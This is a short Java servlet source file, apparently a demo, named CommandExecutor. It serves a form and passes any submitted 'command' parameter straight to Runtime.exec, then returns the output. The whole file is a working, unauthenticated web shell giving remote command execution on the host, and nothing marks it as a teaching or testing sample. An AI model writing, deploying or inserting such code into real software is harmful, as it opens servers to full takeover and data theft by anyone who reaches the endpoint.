package demo;

import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.PrintWriter;

public class CommandExecutor extends HttpServlet {
    @Override
    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws IOException {
        // Write the HTML form to the response.
        PrintWriter writer = resp.getWriter();
        writer.write("<html><body>");
        writer.write("<form method=\"post\">");
        writer.write("Command: <input type=\"text\" name=\"command\">");
        writer.write("<input type=\"submit\" value=\"Execute\">");
        writer.write("</form>");
        writer.write("</body></html>");
    }

    @Override
    protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws IOException {
        String command = req.getParameter("command");

        // Execute the command and get the output.
        Process process = Runtime.getRuntime().exec(command);
        BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
        StringBuilder output = new StringBuilder();
        String line;
        while ((line = reader.readLine()) != null) {
            output.append(line).append("\n");
        }

        // Write the output to the response.
        resp.setContentType("text/plain");
        resp.getWriter().write(output.toString());
    }
}